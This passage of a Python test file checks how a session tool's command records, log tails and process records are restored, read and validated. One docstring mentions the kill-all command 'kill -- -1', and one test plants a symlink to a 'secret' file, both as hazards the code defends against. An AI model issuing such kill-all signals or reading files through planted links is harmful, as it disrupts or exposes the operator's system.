    (base / _cid(9)).write_text("a file, not a directory")
    os.symlink(base / _cid(5), base / _cid(8))
    (base / _cid(7)).mkdir()
    (base / _cid(6)).mkdir()
    (base / _cid(6) / "request.json").write_text("{")

    restored = cf.restore(SID, tmp_path)

    assert [c.id for c in restored.commands] == [_cid(1), _cid(5), _cid(3), _cid(4), _cid(2)]
    assert all(not c.is_open for c in restored.commands)
    assert isinstance(restored.commands[0].end, End)
    assert restored.commands[0].end.outcome == Lapsed()
    assert [cid for cid, _ in restored.unreadable] == [_cid(6), _cid(7)]
    assert (
        "request.json" in restored.unreadable[0][1] and "request.json" in restored.unreadable[1][1]
    )
    assert restored.newer == () and restored.problem is None


def test_restore_of_nothing_is_empty_and_not_a_problem(tmp_path: Path) -> None:
    assert cf.restore(SID, tmp_path) == Restored()
    (tmp_path / SID).mkdir()
    assert cf.restore(SID, tmp_path) == Restored()
    assert list((tmp_path / SID).iterdir()) == []


def test_restore_takes_a_bounded_number_of_entries_and_says_so(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(cf, "MAX_COMMANDS", 3)
    for n in range(3):
        _written(cf.write_request(dataclasses.replace(ASKED, id=_cid(n)), tmp_path))
    assert cf.restore(SID, tmp_path).problem is None
    assert len(cf.restore(SID, tmp_path).commands) == 3
    for n in range(3, 6):
        _written(cf.write_request(dataclasses.replace(ASKED, id=_cid(n)), tmp_path))
    over = cf.restore(SID, tmp_path)
    assert over.problem is not None and "3" in over.problem
    assert len(over.commands) == 3 and over.unreadable == ()


def test_restore_of_a_commands_that_is_not_a_directory_is_a_problem(tmp_path: Path) -> None:
    (tmp_path / SID).mkdir()
    (tmp_path / SID / "commands").write_text("x")
    restored = cf.restore(SID, tmp_path)
    assert restored.commands == () and restored.problem is not None


def test_the_default_root_is_sessionfiles(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    from pptmstr import sessionfile, settings

    monkeypatch.setattr(settings, "config_dir", lambda: tmp_path / "config")
    _record_all(ENDED[0], None)
    assert (sessionfile.root() / SID / "commands" / CID / "end.json").is_file()
    assert sessionfile.root() == tmp_path / "config" / "sessions"
    assert cf.read_command(SID, CID) == ENDED[0]
    assert cf.restore(SID).commands == (ENDED[0],)


# -- the tail ---------------------------------------------------------------------


def _with_log(root: Path, data: bytes) -> None:
    _record_all(dataclasses.replace(ASKED, run=RUN), root)
    log = cf.open_log(SID, CID, root)
    assert not isinstance(log, Unwritten)
    with log:
        log.write(data)


def test_the_tail_is_the_end_of_the_log_when_there_is_no_tail_file(tmp_path: Path) -> None:
    _with_log(tmp_path, b"one\ntwo\n")
    assert cf.tail(SID, CID, tmp_path) == "one\ntwo\n"


def test_the_tail_of_a_long_log_is_its_last_bytes_and_no_more(tmp_path: Path) -> None:
    data = b"".join(b"%07d\n" % n for n in range(40_000))
    _with_log(tmp_path, data)
    got = cf.tail(SID, CID, tmp_path)
    assert got.encode() == data[-cf.MAX_TAIL_FILE_BYTES :]
    assert got.endswith("0039999\n")


def test_the_tail_file_is_preferred_to_the_log(tmp_path: Path) -> None:
    _with_log(tmp_path, b"the start, cut here")
    _written(cf.write_tail(SID, CID, b"the real end\n", tmp_path))
    assert cf.tail(SID, CID, tmp_path) == "the real end\n"


def test_a_tail_file_that_cannot_be_read_is_not_answered_from_the_cut_log(tmp_path: Path) -> None:
    _with_log(tmp_path, b"the start, cut here")
    os.mkfifo(_dir(tmp_path) / "output.tail")
    assert cf.tail(SID, CID, tmp_path) == ""


def test_bytes_that_are_not_text_are_replaced(tmp_path: Path) -> None:
    _with_log(tmp_path, b"ok \xff\xfe \xe2\x82")
    assert cf.tail(SID, CID, tmp_path) == "ok �� �"


@pytest.mark.parametrize("kind", ["fifo", "link", "dir", "absent"])
def test_the_tail_of_anything_but_a_regular_file_is_empty_and_does_not_wait(
    tmp_path: Path, kind: str
) -> None:
    _record_all(dataclasses.replace(ASKED, run=RUN), tmp_path)
    path = _dir(tmp_path) / "output.log"
    secret = tmp_path / "secret"
    secret.write_text("not yours")
    if kind == "fifo":
        os.mkfifo(path)
    elif kind == "link":
        os.symlink(secret, path)
    elif kind == "dir":
        path.mkdir()
    assert cf.tail(SID, CID, tmp_path) == ""
    assert cf.tail(SID, _cid(404), tmp_path) == ""


# -- the process a run became, and a quit that did not see the end ----------------

STARTED = Started(pid=4242, pgid=4242, at=1010.5, start_ticks=987654, boot_id="b00t")


def test_the_started_record_round_trips_and_is_written_once(tmp_path: Path) -> None:
    running = dataclasses.replace(ASKED, run=RUN)
    assert isinstance(cf.write_started(SID, CID, STARTED, tmp_path), Unwritten), "no run yet"
    _record_all(running, tmp_path)
    assert cf.read_started(SID, CID, tmp_path) is None
    assert cf.write_started(SID, CID, STARTED, tmp_path) == Written(_dir(tmp_path) / "started.json")
    assert cf.read_started(SID, CID, tmp_path) == STARTED
    other = dataclasses.replace(STARTED, pid=7, pgid=7)
    assert cf.write_started(SID, CID, other, tmp_path) == Unwritten(cf.ALREADY_RECORDED)
    assert cf.read_started(SID, CID, tmp_path) == STARTED
    # It changes no state: the command reads as it did without it.
    assert cf.read_command(SID, CID, tmp_path) == dataclasses.replace(
        running, end=End(EndUnknown(), at=RUN.started_at)
    )
    bare = Started(pid=4242, pgid=4242, at=1.0)
    root = tmp_path / "bare"
    _record_all(running, root)
    _written(cf.write_started(SID, CID, bare, root))
    assert cf.read_started(SID, CID, root) == bare


def test_a_quit_that_did_not_see_the_end_is_on_the_record_until_an_end_is(
    tmp_path: Path,
) -> None:
    running = dataclasses.replace(ASKED, run=RUN)
    why = "its end had not been recorded in time"
    assert isinstance(cf.write_unconfirmed(SID, CID, why, 1500.0, 4242, tmp_path), Unwritten)
    _record_all(running, tmp_path)
    _written(cf.write_unconfirmed(SID, CID, why, 1500.0, 4242, tmp_path))
    assert cf.write_unconfirmed(SID, CID, "other", 1.0, None, tmp_path) == Unwritten(
        cf.ALREADY_RECORDED
    )
    read = _command(cf.read_command(SID, CID, tmp_path))
    assert read.end == End(EndUnknown(), at=RUN.started_at, unconfirmed=why)
    assert not read.is_open and read.unsupervised is None

    # The worker outlived the quit's bound and recorded the end after all.
    ended = dataclasses.replace(running, end=_RAN_ENDS[4])
    _written(cf.write_end(ended, tmp_path))
    assert cf.read_command(SID, CID, tmp_path) == ended

    root = tmp_path / "ended-first"
    _record_all(ended, root)
    refused = cf.write_unconfirmed(SID, CID, why, 1500.0, 4242, root)
    assert isinstance(refused, Unwritten) and "end.json" in refused.reason


def test_an_end_written_before_leftovers_were_counted_reads_as_not_recorded(
    tmp_path: Path,
) -> None:
    command = _ended(End(Exited(0), at=1020.0, duration_s=1.0, leftover=3), with_run=True)
    _record_all(command, tmp_path)
    path = _dir(tmp_path) / cf.END_NAME
    obj = json.loads(path.read_text())
    assert obj["leftover"] == 3 and obj["unconfirmed"] is None
    del obj["leftover"], obj["unconfirmed"]
    path.unlink()
    _put(path, obj)
    read = _command(cf.read_command(SID, CID, tmp_path))
    assert read.end is not None and read.end.leftover is None and read.end.unconfirmed is None
    for key, wrong in (("leftover", "3"), ("leftover", True), ("unconfirmed", 3)):
        path.unlink()
        _put(path, {**obj, key: wrong})
        assert isinstance(cf.read_command(SID, CID, tmp_path), Unreadable), (key, wrong)


def test_neither_side_file_however_it_got_there_opens_a_command_or_finds_a_process(
    tmp_path: Path,
) -> None:
    """
    ``started.json`` and ``unconfirmed.json`` in every state -- absent, good,
    a later build's, spoiled in each way -- beside each state the three state
    files can be in. The command read is the one read without them, but for
    the reason a good ``unconfirmed.json`` adds to an ``EndUnknown``; a spoiled
    ``started.json`` names no process; and nothing here says a process is alive.
    """
    spoilers = _spoilers(tmp_path)
    good_started = {
        "format": cf.FORMAT,
        "pid": 4242,
        "pgid": 4242,
        "at": 1.0,
        "start_ticks": 5,
        "boot_id": "b",
    }
    good_unconfirmed = {"format": cf.FORMAT, "reason": "not seen", "at": 2.0, "pid": 4242}
    bases = [
        ASKED,
        dataclasses.replace(ASKED, run=RUN),
        *ENDED,
    ]
    serial = itertools.count()
    checked = 0
    for base in bases:
        for name, good in (
            (cf.STARTED_NAME, good_started),
            (cf.UNCONFIRMED_NAME, good_unconfirmed),
        ):
            for state in ("good", "newer", *spoilers):
                cid = f"cmd-20261013T101500Z-{next(serial):012x}"
                command = dataclasses.replace(base, id=cid)
                _record_all(command, tmp_path)
                plain = _command(cf.read_command(SID, cid, tmp_path))
                obj = {**good, "id": cid}
                path = _dir(tmp_path, cid) / name
                if state == "good":
                    _put(path, obj)
                elif state == "newer":
                    _put(path, {**obj, "format": cf.FORMAT + 1})
                else:
                    spoilers[state](path, obj)
                    for leftover in (tmp_path / "elsewhere.json",):
                        leftover.unlink(missing_ok=True)
                read = _command(cf.read_command(SID, cid, tmp_path))
                assert not read.is_open and read.unsupervised is None and not read.owes_row
                expected = plain
                adds = (
                    name == cf.UNCONFIRMED_NAME
                    and state in ("good", "newer")
                    and plain.end is not None
                    and plain.end.outcome == EndUnknown()
                    and base.end is None
                )
                if adds:
                    assert plain.end is not None
                    expected = dataclasses.replace(
                        plain, end=dataclasses.replace(plain.end, unconfirmed="not seen")
                    )
                assert read == expected, (base.end, name, state)
                found = cf.read_started(SID, cid, tmp_path)
                if name == cf.STARTED_NAME and state in ("good", "newer"):
                    assert found == Started(4242, 4242, 1.0, 5, "b")
                else:
                    assert found is None, (name, state)
                checked += 1
    assert checked > 400


@pytest.mark.parametrize("pid, pgid", [(0, 5), (1, 5), (5, 0), (5, 1), (-3, 5), (5, -5)])
def test_a_started_record_that_names_no_group_of_its_own_is_not_read(
    tmp_path: Path, pid: int, pgid: int
) -> None:
    """
    ``kill -- -1`` is every process the operator owns, and the row prints the
    line from this number.
    """
    _record_all(dataclasses.replace(ASKED, run=RUN), tmp_path)
    _put(
        _dir(tmp_path) / cf.STARTED_NAME,
        {"format": 1, "id": CID, "pid": pid, "pgid": pgid, "at": 1.0},
    )
    assert cf.read_started(SID, CID, tmp_path) is None
    with pytest.raises(ValueError):
        Started(pid=pid, pgid=pgid, at=1.0)


def test_a_process_seen_gone_is_recorded_once_and_only_after_one_was_started(
    tmp_path: Path,
) -> None:
    """
    ``gone.json`` is what stops a record being asked about at every start,
    until the number it holds is some other process's.
    """
    running = dataclasses.replace(ASKED, run=RUN)
    _written(cf.write_request(ASKED, tmp_path))
    _written(cf.write_run(running, tmp_path))
    assert cf.read_gone(SID, CID, tmp_path) is None
    refused = cf.write_gone(SID, CID, "nothing alive", 1500.0, tmp_path)
    assert isinstance(refused, Unwritten) and "started.json" in refused.reason
    _written(cf.write_started(SID, CID, STARTED, tmp_path))
    assert cf.read_gone(SID, CID, tmp_path) is None

    assert isinstance(cf.write_gone(SID, CID, "", 1500.0, tmp_path), Unwritten)
    assert cf.read_gone(SID, CID, tmp_path) is None
    assert cf.write_gone(SID, CID, "nothing alive", 1500.0, tmp_path) == Written(
        _dir(tmp_path) / "gone.json"
    )
    assert cf.read_gone(SID, CID, tmp_path) == "nothing alive"
    assert cf.write_gone(SID, CID, "other", 1.0, tmp_path) == Unwritten(cf.ALREADY_RECORDED)
    assert cf.read_gone(SID, CID, tmp_path) == "nothing alive"
    obj = json.loads((_dir(tmp_path) / "gone.json").read_text())
    assert obj == {"format": cf.FORMAT, "id": CID, "why": "nothing alive", "at": 1500.0}

    # It changes no state and is no end: the command reads as it did.
    read = cf.read_command(SID, CID, tmp_path)
    assert read == dataclasses.replace(running, end=End(EndUnknown(), at=RUN.started_at))
    assert cf.read_started(SID, CID, tmp_path) == STARTED


@pytest.mark.parametrize(
    "spoiled",
    [
        "{ not json",
        '{"format": 1, "id": "cmd-20261013T101500Z-0000000000ff", "why": "x"}',
        '{"format": 1, "id": "%s", "why": 3}',
        '{"format": 1, "id": "%s"}',
    ],
)
def test_a_gone_record_that_cannot_be_read_stops_nothing(tmp_path: Path, spoiled: str) -> None:
    """
    Read as absent: the process is then looked for, which is the answer that
    cannot hide one that is alive.
    """
    _written(cf.write_request(ASKED, tmp_path))
    _written(cf.write_run(dataclasses.replace(ASKED, run=RUN), tmp_path))
    (_dir(tmp_path) / "gone.json").write_text(spoiled % CID if "%s" in spoiled else spoiled)
    assert cf.read_gone(SID, CID, tmp_path) is None
    assert cf.read_gone("no-such-session", CID, tmp_path) is None
